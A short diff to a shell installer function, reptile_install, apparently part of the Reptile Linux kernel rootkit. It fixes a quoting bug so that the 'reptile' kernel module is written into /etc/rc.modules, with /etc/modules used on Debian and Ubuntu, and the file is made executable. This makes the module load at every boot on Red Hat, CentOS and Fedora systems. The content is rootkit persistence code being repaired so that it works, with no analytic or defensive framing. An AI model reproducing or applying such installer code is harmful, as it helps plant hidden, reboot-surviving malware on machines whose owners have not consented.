@@ -128,7 +128,7 @@ function reptile_install {
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
         	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/rc.modules && \
+        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
         #	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
